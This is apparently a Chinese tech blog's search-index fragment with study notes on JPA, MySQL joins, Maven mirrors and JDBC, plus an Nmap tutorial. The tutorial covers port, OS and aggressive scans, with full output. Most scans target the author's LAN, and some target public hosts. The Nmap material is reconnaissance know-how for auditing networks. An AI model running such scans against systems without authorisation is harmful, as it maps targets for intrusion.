@Entit","date":"2021-08-26","objectID":"/posts/jpa/:0:0","tags":["JPA"],"title":"JPA","uri":"/posts/jpa/"},{"categories":["java后端"],"content":"@JoinColumn @OneToOne注释只能确定实体与实体的关系是一对一的关系，不能指定数据库表中的保存的关联字段。所以此时要结合@JoinColumn标记来指定保存实体关系的配置。 @JoinColumn与本书上一章讲述的@Column注释类似，它的定义如下代码所示。 1. @Target({METHOD, FIELD}) 2. @Retention(RUNTIME) 3. String name() default \"\"; 4. String referencedColumnName() default \"\"; 5. boolean unique() default false; 6. boolean nullable() default true; 7. boolean insertable() default true; 8. boolean updatable() default true; 9. String columnDefinition() default \"\"; 10. String table() default \"\"; 11. } ","date":"2021-08-26","objectID":"/posts/jpa/:1:0","tags":["JPA"],"title":"JPA","uri":"/posts/jpa/"},{"categories":["java后端"],"content":"在使用@JoinColumn注释时，应注意以下几个问题： 1、 @JoinColumn与@Column标记一样，是用于注释表中的字段的。它的属性与@Column属性有很多相同之处，这里就不详细讲述。请读者参阅5.2.2小节中有关@Column属性的部分。 2、@JoinColumn与@Column相区别的是：@JoinColumn注释的是保存表与表之间关系的字段，它要标注在实体属性上。而@Column标注的是表中不包含表关系的字段。 3、与@Column标记一样，name属性是用来标识表中所对应的字段的名称。 例如customer表中存在字段addr_id，标识的代码如下所示。 1. @OneToOne 2. @JoinColumn(name = \"addr_id\") 3. public AddressEO getAddress() { 4. return address; 5. } 若此时，不设置name的值，则在默认情况下，name的取值遵循以下规则： name=关联表的名称+“_”+ 关联表主键的字段名 例如，CustomerEO实体中，如果不指定name的值，默认将对应name=address_id； 因为@JoinColumn注释在实体 AddressEO属性上，实体AddressEO对应的表名为“address”；表address的主键是“id”，所以此时对应的默认的字段名称为 “address_id”。 ","date":"2021-08-26","objectID":"/posts/jpa/:2:0","tags":["JPA"],"title":"JPA","uri":"/posts/jpa/"},{"categories":["java后端"],"content":"提示： 此规则只适用于与@OneToOne标记同时使用时。若与@ManyToOne或@ManyToMany标记同时使用时，将遵循其他的规则。 1、默认情况下，关联的实体的主键一般是用来做外键的。但如果此时不想主键作为外键，则需要设置referencedColumnName属性。 例如，将address表中增加一个字段“ref_id”，address表的建表SQL变为以下所示。 1. CREATE TABLE address ( id int(20) NOT NULL auto_increment, 3. ref_id int int(20) NOT NULL, 4. province varchar(50) , 5. city varchar(50) , 6. postcode varchar(50) , 7. detail varchar(50) , 8. PRIMARY KEY (id) 9. ) 此时，通过customer表中的“address_id”字段关联的是address表中的“ref_id”，而“ref_id”并不是address表中的主键，则实体中标注如代码下所示。 @OneToOne @JoinColumn(name = \"address_id\",referencedColumn) public AddressEO getAddress() { return address; } 属性referencedColumnName标注的是所关联表中的字段名，若不指定则使用的所关联表的主键字段名作为外键。 JoinColumn标记不仅能够与@OneToOne使用，也可以@ManyToOne或@ManyToMany标记同时使用，它们所表示的含义不同。 ","date":"2021-08-26","objectID":"/posts/jpa/:3:0","tags":["JPA"],"title":"JPA","uri":"/posts/jpa/"},{"categories":["数据库"],"content":"首先，mysql本身是没有提供全外连接的， MySql中多表查询只提供了内连接，左外连接与右外连接： table_reference {[INNER] JOIN | {LEFT|RIGHT} [OUTER] JOIN} table_reference ON conditional_expr 1】INNER JOIN ON内连接（只写join时默认为内连接） SELECT * FROM emp e JOIN dept d ON e.deptno=d.deptno; 2】外连接：在左外连接和右外连接时都会以一张表为基表，该表的内容会全部显示，然后加上两张表匹配的内容。如果基表的数据在另一张表没有记录。那么在相关联的结果集行中列显示为空值（NULL）。 2.1、左外连接：显示左表的全部记录 SELECT * FROM emp e LEFT JOIN dept d ON e.deptno=d.deptno; 2.2、右外连接：显示右表的全部记录 SELECT * FROM emp e RIGHT JOIN dept d ON e.deptno=d.deptno; 2.3、全外连接：左表和右表都不做限制，所有的记录都显示，两表不足的地方用null 填充； 也就是： 左外连接=左表全部记录+相关联结果 右外连接=右表全部记录+相关联结果 全外连接=左表全部记录+右表全部记录+相关联结果=左外连接+右外连接-相关联结果（即去重复) 那么在MYSQL中谁可以做到呢？ UNION UNION 操作符用于合并两个或多个 SELECT 语句的结果集。 注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。 故实现全外连接可以使用： SELECT * FROM emp e LEFT JOIN dept d ON e.deptno=d.deptno UNION SELECT * FROM emp e RIGHT JOIN dept d ON e.deptno=d.deptno; 注释：以上连接全为等值连接；Oracle中全外连接可以使用full join；请不要弄混。 ","date":"2021-08-26","objectID":"/posts/%E5%85%A8%E5%A4%96%E8%BF%9E%E6%8E%A5oraclemysql/:0:0","tags":["全外连接"],"title":"全外连接？Oracle!MySQL？","uri":"/posts/%E5%85%A8%E5%A4%96%E8%BF%9E%E6%8E%A5oraclemysql/"},{"categories":["java后端"],"content":"​ springboot依赖导入的时候需要从公网仓库拉取JAR包，同时为了自己代码的安全性，自己也会封装一部分JAR包上传到自己的私库或者内网服务器上 在项目中使用Maven管理jar包依赖，往往会出现以下状况： 1、国内访问maven默认远程中央镜像特别慢； 2、使用阿里的镜像替代远程中央镜像； 3、阿里云镜像中缺少部分jar包； 4、同时使用私有仓库和公有仓库； 针对以上情况，我们就需要让Maven支持多仓库配置。 单独仓库配置 当只配置一个仓库时，操作比较简单，直接在Maven的settings.xml文件中进行全局配置即可，以阿里云的镜像为例： \u003cmirrors\u003e \u003cmirror\u003e \u003cid\u003ealimaven\u003c/id\u003e \u003cname\u003ealiyun maven\u003c/name\u003e \u003curl\u003ehttp://maven.aliyun.com/nexus/content/groups/public/\u003c/url\u003e \u003cmirrorOf\u003ecentral\u003c/mirrorOf\u003e \u003c/mirror\u003e \u003c/mirrors\u003e 只用新增一个mirror配置即可。 要做到单一仓库，设置mirrorOf到*。 只用新增一个mirror配置即可。要做到单一仓库，设置mirrorOf到*。 mirrorOf中配置的星号，表示匹配所有的artifacts，也就是everything使用这里的代理地址。上面的mirrorOf配置了具体的名字，指的是repository的名字。 镜像配置说明： 1、id: 镜像的唯一标识； 2、name: 名称描述； 3、url: 地址； 4、mirrorOf: 指定镜像规则，什么情况下从镜像仓库拉取。 *: 匹配所有，所有内容都从镜像拉取； external:*: 除了本地缓存的所有从镜像仓库拉取； repo,repo1: repo或者repo1，这里的repo指的仓库ID； *,!repo1: 除了repo1的所有仓库； \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cproject xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"\u003e \u003cmodelVersion\u003e4.0.0\u003c/modelVersion\u003e \u003cparent\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-starter-parent\u003c/artifactId\u003e \u003cversion\u003e2.3.1.RELEASE\u003c/version\u003e \u003crelativePath/\u003e \u003c!-- lookup parent from repository --\u003e \u003c/parent\u003e \u003cgroupId\u003esol\u003c/groupId\u003e \u003cartifactId\u003eedrms\u003c/artifactId\u003e \u003cversion\u003e5.12.1.1\u003c/version\u003e \u003cname\u003eedrms\u003c/name\u003e \u003cdescription\u003eedrms core\u003c/description\u003e \u003cproperties\u003e \u003cjava.version\u003e1.8\u003c/java.version\u003e \u003ccom.hank.core.version\u003e3.3\u003c/com.hank.core.version\u003e \u003ccom.hank.common.version\u003e3.6\u003c/com.hank.common.version\u003e \u003ccom.hank.i18n.version\u003e3.0\u003c/com.hank.i18n.version\u003e \u003ccom.hank.es.version\u003e1.1\u003c/com.hank.es.version\u003e \u003celasticsearch.version\u003e6.7.1\u003c/elasticsearch.version\u003e \u003cspring4all.swagger.version\u003e1.9.0.RELEASE\u003c/spring4all.swagger.version\u003e \u003c/properties\u003e \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003ecom.hank\u003c/groupId\u003e \u003cartifactId\u003ees-spring-boot-starter\u003c/artifactId\u003e \u003cversion\u003e${com.hank.es.version}\u003c/version\u003e \u003c/dependency\u003e \u003cdepend","date":"2021-08-11","objectID":"/posts/maven%E6%8B%89%E5%8F%96%E7%A7%81%E5%BA%93jar/:0:0","tags":["maven","jar"],"title":"Maven拉取私库JAR","uri":"/posts/maven%E6%8B%89%E5%8F%96%E7%A7%81%E5%BA%93jar/"},{"categories":["Tools"],"content":"下载nmap https://nmap.org/download.html 安装完成后可能需要npcap的依赖，不懂为啥，安装了就对了https://nmap.org/npcap/ 查看version 使用 Nmap可以完成以下任务： 主机探测 端口扫描 版本检测 系统检测 支持探测脚本的编写 Nmap在实际中应用场合如下： 通过对设备或者防火墙的探测来审计它的安全性 探测目标主机所开放的端口 通过识别新的服务器审计网络的安全性 探测网络上的主机 端口扫描工具，即借助工具，试图了解所扫描IP提供的计算机网络服务类型（网络服务均与端口号相关），从而发现攻击弱点，常见服务对应端口号： 服务 端口号 HTTP 80 HTTPS 443 Telnet 23 FTP 21 SSH（安全登录）、SCP（文件传输）、端口重定向 22 SMTP 25 POP3 110 WebLogic 7001 TOMCAT 8080 WIN2003远程登录 3389 Oracle数据库 1521 MS SQL* SEVER数据库sever 1433 MySQL 数据库sever 3306 ","date":"2021-08-10","objectID":"/posts/nmap/:0:0","tags":["Nmap"],"title":"Nmap","uri":"/posts/nmap/"},{"categories":["Tools"],"content":"1、简单使用 nmap (*ip) nmap默认发送一个ARP的PING数据包，来探测目标主机1-10000范围内所开放的所有端口 命令语法： nmap \u003c*target ip address*\u003e nmap 192.168.1.1 Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-10 16:14 中国标准时间 Nmap scan report for 10.168.9.50 Host is up (0.0051s latency). Not shown: 994 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8000/tcp open http-alt 8002/tcp open teradataordbms 8008/tcp open http 9000/tcp open cslistener MAC Address: D4:5D:64:B8:DC:4E (Asustek Computer) Nmap done: 1 IP address (1 host up) scanned in 1.50 seconds ","date":"2021-08-10","objectID":"/posts/nmap/:1:0","tags":["Nmap"],"title":"Nmap","uri":"/posts/nmap/"},{"categories":["Tools"],"content":"2、nmap -vv (*ip) nmap简单扫描，并对结果返回详细的描述输出 nmap -vv (*ip) G:\\20H2_app\\hugo\\jindongBlog\u003enmap -vv 10.168.9.50 Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-10 16:16 中国标准时间 Initiating ARP Ping Scan at 16:16 Scanning 10.168.9.50 [1 port] Completed ARP Ping Scan at 16:16, 0.13s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 16:16 Completed Parallel DNS resolution of 1 host. at 16:16, 0.02s elapsed Initiating SYN Stealth Scan at 16:16 Scanning 10.168.9.50 [1000 ports] Discovered open port 22/tcp on 10.168.9.50 Discovered open port 80/tcp on 10.168.9.50 Discovered open port 8002/tcp on 10.168.9.50 Discovered open port 8000/tcp on 10.168.9.50 Discovered open port 9000/tcp on 10.168.9.50 Discovered open port 8008/tcp on 10.168.9.50 Completed SYN Stealth Scan at 16:16, 0.74s elapsed (1000 total ports) Nmap scan report for 10.168.9.50 Host is up, received arp-response (0.0052s latency). Scanned at 2021-08-10 16:16:57 中国标准时间 for 1s Not shown: 994 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 64 80/tcp open http syn-ack ttl 63 8000/tcp open http-alt syn-ack ttl 62 8002/tcp open teradataordbms syn-ack ttl 62 8008/tcp open http syn-ack ttl 63 9000/tcp open cslistener syn-ack ttl 62 MAC Address: D4:5D:64:B8:DC:4E (Asustek Computer) Read data files from: C:\\Program Files (x86)\\Nmap Nmap done: 1 IP address (1 host up) scanned in 1.64 seconds Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.052KB) ","date":"2021-08-10","objectID":"/posts/nmap/:2:0","tags":["Nmap"],"title":"Nmap","uri":"/posts/nmap/"},{"categories":["Tools"],"content":"3、自定义端口 nmap -p10000-20000 (*ip) 命令语法：nmap -p(range) \u003ctarget IP\u003e 介绍：（range）为要扫描的端口范围，端口大小不能超过65535 例子：扫描目标主机的50-80号端口 nmap -p50-80 10.0.0.55 C:\\Users\\26505\u003enmap -p1-1000 127.0.0.1 Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-10 16:27 中国标准时间 Nmap scan report for kubernetes.docker.internal (127.0.0.1) Host is up (0.00039s latency). Not shown: 995 closed tcp ports (reset) PORT STATE SERVICE 135/tcp open msrpc 137/tcp filtered netbios-ns 445/tcp open microsoft-ds 902/tcp open iss-realsecure 912/tcp open apex-mesh Nmap done: 1 IP address (1 host up) scanned in 2.05 seconds ","date":"2021-08-10","objectID":"/posts/nmap/:3:0","tags":["Nmap"],"title":"Nmap","uri":"/posts/nmap/"},{"categories":["Tools"],"content":"4、指定端口 nmap -p80,443 (*ip) 命令语法：nmap -p(port1,port2,…) \u003ctarget IP\u003e 介绍：port1,port2…为想要扫描的端口号 例子：扫描目标主机的80，443，801端口 nmap -p80,443,801 10.0.0.55 C:\\Users\\26505\u003enmap -p22,443 22.14.144.124 Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-10 16:30 中国标准时间 Nmap scan report for 22.14.144.124 Host is up (0.063s latency). PORT STATE SERVICE 22/tcp filtered ssh 443/tcp open https Nmap done: 1 IP address (1 host up) scanned in 2.55 seconds ","date":"2021-08-10","objectID":"/posts/nmap/:4:0","tags":["Nmap"],"title":"Nmap","uri":"/posts/nmap/"},{"categories":["Tools"],"content":"5、nmap -sP (*ip) nmap可以利用类似windows/linux系统下的ping 方式进行扫描 命令语法： nmap -sP \u003ctarget ip\u003e 例子：nmap sP 10.1.112.89 C:\\Users\\26505\u003enmap -sP www.baidu.com Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-10 16:34 中国标准时间 Nmap scan report for www.baidu.com (180.101.49.11) Host is up (0.059s latency). Other addresses for www.baidu.com (not scanned): 180.101.49.12 Nmap done: 1 IP address (1 host up) scanned in 0.92 seconds ","date":"2021-08-10","objectID":"/posts/nmap/:5:0","tags":["Nmap"],"title":"Nmap","uri":"/posts/nmap/"},{"categories":["Tools"],"content":"6、nmap 路由跟踪 路由器追踪功能，能够帮助网络管理员了解网络通行情况，同时也是网络管理人员很好的辅助工具，通过路由器追踪可以轻松的查处从我们电脑所在地到目的地之间所经常的网络节点，并可以看到通过各个结点所花费的时间 命令语法： nmap –traceroute \u003ctarget IP\u003e 例子:namp –traceroute 8.8.8.8(geogle dns服务器ip) C:\\Users\\26505\u003enmap -traceroute 8.8.8.8 Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-10 16:35 中国标准时间 Nmap scan report for dns.google (8.8.8.8) Host is up (0.081s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain TRACEROUTE (using port 53/tcp) HOP RTT ADDRESS 1 2.00 ms 192.168.191.225 2 ... 3 40.00 ms 172.19.2.29 4 ... 5 21.00 ms 221.228.22.29 6 ... 11 12 66.00 ms 108.170.241.1 13 70.00 ms 142.251.64.173 14 103.00 ms dns.google (8.8.8.8) Nmap done: 1 IP address (1 host up) scanned in 18.61 seconds ","date":"2021-08-10","objectID":"/posts/nmap/:6:0","tags":["Nmap"],"title":"Nmap","uri":"/posts/nmap/"},{"categories":["Tools"],"content":"7、nmap设置扫描一个网段下的ip 命令语法： nmap -sP \u003cnetwork address\u003e \u003c/CIDR\u003e 介绍：CIDR为设置的子网掩码（/24,/16,/8等） 例子：nmap -sP 10.1.1.0 /24 ","date":"2021-08-10","objectID":"/posts/nmap/:7:0","tags":["Nmap"],"title":"Nmap","uri":"/posts/nmap/"},{"categories":["Tools"],"content":"8、nmap 操作系统类型的探测 命令语法： nmap -0 \u003ctarget IP\u003e 例子：nmap -O(大写的o) 10.1.112.89 C:\\Users\\26505\u003enmap -O 10.168.9.191 Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-10 16:42 中国标准时间 Nmap scan report for hp-jd.lan (10.168.9.191) Host is up (0.00083s latency). Not shown: 978 closed tcp ports (reset) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 902/tcp open iss-realsecure 912/tcp open apex-mesh 1055/tcp open ansyslmd 1060/tcp open polestar 1087/tcp open cplscrambler-in 1117/tcp open ardus-mtrns 3301/tcp open unknown 3306/tcp open mysql 5357/tcp open wsdapi 7001/tcp open afs3-callback 7002/tcp open afs3-prserver 8001/tcp open vcom-tunnel 8002/tcp open teradataordbms 8080/tcp open http-proxy 9000/tcp open cslistener 9002/tcp open dynamid 9090/tcp open zeus-admin 15000/tcp open hydap 50000/tcp open ibm-db2 Device type: general purpose Running: Microsoft Windows 10 OS CPE: cpe:/o:microsoft:windows_10 OS details: Microsoft Windows 10 1809 - 1909 Network Distance: 0 hops OS detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 2.18 seconds ","date":"2021-08-10","objectID":"/posts/nmap/:8:0","tags":["Nmap"],"title":"Nmap","uri":"/posts/nmap/"},{"categories":["Tools"],"content":"9、nmap万能开关 包含了1-10000端口ping扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测 命令语法： nmap -A \u003ctarget ip\u003e 例子：nmap -A 10.1.112.89 C:\\Users\\26505\u003enmap -A 10.168.9.50 Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-10 16:44 中国标准时间 Service scan Timing: About 83.33% done; ETC: 16:45 (0:00:16 remaining) Nmap scan report for 10.168.9.50 Host is up (0.0041s latency). Not shown: 994 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 3072 2e:13:05:c8:dc:42:ba:3e:6b:43:f0:16:04:42:08:cc (RSA) | 256 77:59:df:1b:99:b2:bd:01:e6:db:45:9d:5b:84:e3:e5 (ECDSA) |_ 256 49:ee:8f:ac:cd:f0:79:f8:cd:06:ba:45:ac:2a:9f:8d (ED25519) 80/tcp open http nginx | http-title: Site doesn't have a title (text/html). |_Requested resource was /wcm/edrms 8000/tcp open nagios-nsca Nagios NSCA |_http-title: Site doesn't have a title (text/plain; charset=utf-8). 8002/tcp open teradataordbms? | fingerprint-strings: | FourOhFourRequest, GetRequest: | HTTP/1.1 404 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 431 | Date: Tue, 10 Aug 2021 08:44:29 GMT | Connection: close | \u003c!doctype html\u003e\u003chtml lang=\"en\"\u003e\u003chead\u003e\u003ctitle\u003eHTTP Status 404 | Found\u003c/title\u003e\u003cstyle type=\"text/css\"\u003ebody {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u003c/style\u003e\u003c/head\u003e\u003cbody\u003e\u003ch1\u003eHTTP Status 404 | Found\u003c/h1\u003e\u003c/body\u003e\u003c/html\u003e | HTTPOptions: | HTTP/1.1 404 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 431 | Date: Tue, 10 Aug 2021 08:44:34 GMT | Connection: close | \u003c!doctype html\u003e\u003chtml lang=\"en\"\u003e\u003chead\u003e\u003ctitle\u003eHTTP Status 404 | Found\u003c/title\u003e\u003cstyle type=\"text/css\"\u003ebody {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:bl","date":"2021-08-10","objectID":"/posts/nmap/:9:0","tags":["Nmap"],"title":"Nmap","uri":"/posts/nmap/"},{"categories":["Tools"],"content":"10、nmap命令混合式扫描 可以做到类似参数-A所完成的功能，但又能细化我们的需求要求 命令语法： nmap -vv -p1-100 -O \u003ctarget ip\u003e 例子： nmap -vv -p1-100 -O 10.1.112.89 G:\\20H2_app\\hugo\\jindongBlog\u003enmap -vv -p0-1000 10.168.9.50 Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-10 16:45 中国标准时间 Initiating ARP Ping Scan at 16:45 Scanning 10.168.9.50 [1 port] Completed ARP Ping Scan at 16:45, 0.12s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 16:45 Completed Parallel DNS resolution of 1 host. at 16:45, 0.01s elapsed Initiating SYN Stealth Scan at 16:45 Scanning 10.168.9.50 [1001 ports] Discovered open port 22/tcp on 10.168.9.50 Discovered open port 80/tcp on 10.168.9.50 Completed SYN Stealth Scan at 16:45, 0.57s elapsed (1001 total ports) Nmap scan report for 10.168.9.50 Host is up, received arp-response (0.0057s latency). Scanned at 2021-08-10 16:45:02 中国标准时间 for 1s Not shown: 999 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 64 80/tcp open http syn-ack ttl 63 MAC Address: D4:5D:64:B8:DC:4E (Asustek Computer) Read data files from: C:\\Program Files (x86)\\Nmap Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds Raw packets sent: 1002 (44.072KB) | Rcvd: 1002 (40.076KB) ","date":"2021-08-10","objectID":"/posts/nmap/:10:0","tags":["Nmap"],"title":"Nmap","uri":"/posts/nmap/"},{"categories":["Java后端"],"content":"开始 ","date":"2021-08-06","objectID":"/posts/springsecurity/:0:0","tags":[],"title":"Springsecurity","uri":"/posts/springsecurity/"},{"categories":["大三下实训笔记"],"content":"JDBC工具类","date":"2021-07-28","objectID":"/posts/jdbc-01/","tags":[],"title":"JDBC-01","uri":"/posts/jdbc-01/"},{"categories":["大三下实训笔记"],"content":"JDBC-01 ","date":"2021-07-28","objectID":"/posts/jdbc-01/:0:0","tags":[],"title":"JDBC-01","uri":"/posts/jdbc-01/"},{"categories":["大三下实训笔记"],"content":"〇.本章目标 掌握jdbc的快速入门 能够使用jdbc完成对数据库表中数据的crud; 理解如何防止sql注入 使用jdbc完成事务控制 ","date":"2021-07-28","objectID":"/posts/jdbc-01/:0:1","tags":[],"title":"JDBC-01","uri":"/posts/jdbc-01/"},{"categories":["大三下实训笔记"],"content":"一、JDBC快速入门（动手-掌握） 1.jdbc的概念 JDBC（Java DataBase Connectivity,java数据库连接）是一种用于执行SQL语句的Java API，可以为多种关系型数据库提供统一访问，它是由一组用Java语言编写的类和接口组成的。 2.jdbc的本质 其实就是java官方提供的一套规范(接口)。用于帮助开发人员快速实现不同关系型数据库的连接！ 3.jdbc的快速入门程序 导入jar包 注册驱动 Class.forName(\"com.mysql.jdbc.Driver\"); 获取连接 Connection con = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/db2\", \"root\", \"root\"); 获取执行者对象 Statement stat = con.createStatement(); 执行sql语句，并接收返回结果 String sql = \"SELECT * FROM user\"; ResultSet rs = stat.executeQuery(sql); 处理结果 while(rs.next()) { System.out.println(rs.getInt(\"id\") + \"\\t\" + rs.getString(\"name\")); } 释放资源 con.close(); stat.close(); rs.close(); public class JDBCDemo01 { public static void main(String[] args) throws Exception{ //1.导入jar包 //2.注册驱动 Class.forName(\"com.mysql.jdbc.Driver\"); //3.获取连接 Connection con = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/db04\",\"root\",\"root\"); //4.获取执行者对象 Statement stat = con.createStatement(); //5.执行sql语句，并且接收结果 String sql = \"SELECT * FROM user\"; ResultSet rs = stat.executeQuery(sql); //6.处理结果 while(rs.next()) { System.out.println(rs.getInt(\"id\") + \"\\t\" + rs.getString(\"name\")); } //7.释放资源 con.close(); stat.close(); rs.close(); } } 【小结： 注意： 获取连接这一步 ip地址如果是本机： localhost 快速入门： 抽取到单元测试：（只用关心5、6） ","date":"2021-07-28","objectID":"/posts/jdbc-01/:0:2","tags":[],"title":"JDBC-01","uri":"/posts/jdbc-01/"},{"categories":["大三下实训笔记"],"content":"二、JDBC各个功能类详解（理解） 1.DriverManager DriverManager：驱动管理对象 注册驱动(告诉程序该使用哪一个数据库驱动) static void registerDriver(Driver driver)：注册与给定的驱动程序 DriverManager 写代码使用：Class.forName(“com.mysql.jdbc.Driver”); 通过查看源码发现：在com.mysql.jdbc.Driver类中存在静态代码块 static { try { java.sql.DriverManager.registerDriver(new Driver()); } catch (SQLException E) { throw new RuntimeException(\"Can't register driver!\"); } } 注意：mysql5之后的驱动jar包可以省略注册驱动的步骤。在jar包中，存在一个java.sql.Driver配置文件，文件中指定了com.mysql.jdbc.Driver 获取数据库连接(获取到数据库的连接并返回连接对象) static Connection getConnection(String url, String user, String password); 返回值：Connection数据库连接对象 参数 url：指定连接的路径。语法：jdbc:mysql://ip地址(域名):端口号/数据库名称 user：用户名 password：密码 2.Connection Connection：数据库连接对象 获取执行者对象 获取普通执行者对象：Statement createStatement(); 获取预编译执行者对象：PreparedStatement prepareStatement(String sql); 管理事务 开启事务：setAutoCommit(boolean autoCommit); 参数为false，则开启事务。 – (改为手动提交) 提交事务：commit(); 回滚事务：rollback(); 释放资源 立即将数据库连接对象释放：void close(); 3.Statement Statement：执行sql语句的对象 执行DML语句：int executeUpdate(String sql); 返回值int：返回影响的行数。 参数sql：可以执行insert、update、delete语句。 执行DQL语句：ResultSet executeQuery(String sql); 返回值ResultSet：封装查询的结果。 参数sql：可以执行select语句。 释放资源 立即将执行者对象释放：void close(); 4.ResultSet ResultSet：结果集对象 判断结果集中是否还有数据：boolean next(); 有数据返回true，并将索引向下移动一行 没有数据返回false 获取结果集中的数据：XXX getXxx(“列名”); XXX代表数据类型(要获取某列数据，这一列的数据类型) 例如：String getString(“name”); int getInt(“age”); 释放资源 立即将结果集对象释放：void close(); 【小结： ","date":"2021-07-28","objectID":"/posts/jdbc-01/:0:3","tags":[],"title":"JDBC-01","uri":"/posts/jdbc-01/"},{"categories":["大三下实训笔记"],"content":"三、JDBC案例student学生表的CRUD（掌握-动手） 1.数据准备 数据库和数据表 -- 创建db14数据库 CREATE DATABASE db14; -- 使用db14数据库 USE db14; -- 创建student表 CREATE TABLE student( sid INT PRIMARY KEY AUTO_INCREMENT, -- 学生id NAME VARCHAR(20), -- 学生姓名 age INT, -- 学生年龄 birthday DATE -- 学生生日 ); -- 添加数据 INSERT INTO student VALUES (NULL,'张三',23,'1999-09-23'),(NULL,'李四',24,'1998-08-10'),(NULL,'王五',25,'1996-06-06'),(NULL,'赵六',26,'1994-10-20'); 实体类 Student类，成员变量对应表中的列 注意：所有的基本数据类型需要使用包装类，以防null值无法赋值 package com.itheima02.domain; import java.util.Date; public class Student { private Integer sid; private String name; private Integer age; private Date birthday; public Student() { } public Student(Integer sid, String name, Integer age, Date birthday) { this.sid = sid; this.name = name; this.age = age; this.birthday = birthday; } public Integer getSid() { return sid; } public void setSid(Integer sid) { this.sid = sid; } public String getName() { return name; } public void setName(String name) { this.name = name; } public Integer getAge() { return age; } public void setAge(Integer age) { this.age = age; } public Date getBirthday() { return birthday; } public void setBirthday(Date birthday) { this.birthday = birthday; } @Override public String toString() { return \"Student{\" + \"sid=\" + sid + \", name='\" + name + '\\'' + \", age=\" + age + \", birthday=\" + birthday + '}'; } } 2.需求一：查询全部 持久层 /* 查询所有学生信息 */ @Override public ArrayList\u003cStudent\u003e findAll() { ArrayList\u003cStudent\u003e list = new ArrayList\u003c\u003e(); Connection con = null; Statement stat = null; ResultSet rs = null; try{ //1.注册驱动 Class.forName(\"com.mysql.jdbc.Driver\"); //2.获取数据库连接 con = DriverManager.getConnection(\"jdbc:mysql://192.168.59.129:3306/db14\", \"root\", \"itheima\"); //3.获取执行者对象 stat = con.createStatement(); //4.执行sql语句，并且接收返回的结果集 String sql = \"SELECT * FROM student\"; rs = stat.executeQuery(sql); //5.处理结果集 while(rs.next()) { Integer sid = rs.getInt(\"sid\"); String name = rs.getString(\"name\"); Integer age = rs.getInt(\"age\"); Date birthday = rs.getDate(\"birthday\"); //封装Student对","date":"2021-07-28","objectID":"/posts/jdbc-01/:0:4","tags":[],"title":"JDBC-01","uri":"/posts/jdbc-01/"},{"categories":["大三下实训笔记"],"content":"四、JDBC工具类(理解) 1.工具类的抽取 配置文件(在src下创建config.properties) driverClass=com.mysql.jdbc.Driver url=jdbc:mysql://localhost:3306/db14 username=root password=itheima 工具类 /* JDBC工具类 */ public class JDBCUtils { //1.私有构造方法 private JDBCUtils(){}; //2.声明配置信息变量 private static String driverClass; private static String url; private static String username; private static String password; private static Connection con; //3.静态代码块中实现加载配置文件和注册驱动 static{ try{ //通过类加载器返回配置文件的字节流 InputStream is = JDBCUtils.class.getClassLoader().getResourceAsStream(\"config.properties\"); //创建Properties集合，加载流对象的信息 Properties prop = new Properties(); prop.load(is); //获取信息为变量赋值 driverClass = prop.getProperty(\"driverClass\"); url = prop.getProperty(\"url\"); username = prop.getProperty(\"username\"); password = prop.getProperty(\"password\"); //注册驱动 Class.forName(driverClass); } catch (Exception e) { e.printStackTrace(); } } //4.获取数据库连接的方法 public static Connection getConnection() { try { con = DriverManager.getConnection(url,username,password); } catch (SQLException e) { e.printStackTrace(); } return con; } //5.释放资源的方法 public static void close(Connection con, Statement stat, ResultSet rs) { if(con != null) { try { con.close(); } catch (SQLException e) { e.printStackTrace(); } } if(stat != null) { try { stat.close(); } catch (SQLException e) { e.printStackTrace(); } } if(rs != null) { try { rs.close(); } catch (SQLException e) { e.printStackTrace(); } } } public static void close(Connection con, Statement stat) { close(con,stat,null); } } 2.使用工具类优化student表的CRUD 查询全部 /* 查询所有学生信息 */ @Override public ArrayList\u003cStudent\u003e findAll() { ArrayList\u003cStudent\u003e list = new ArrayList\u003c\u003e(); Connection con = null; Statement stat = null; ResultSet rs = null; try{ con = JDBCUtils.getConnection(); //3.获取执行者对象 stat = con.createStatement(); //4.执行sql语句，并且接收返回的结果集 String sql = \"SELECT * FROM student\"; rs = 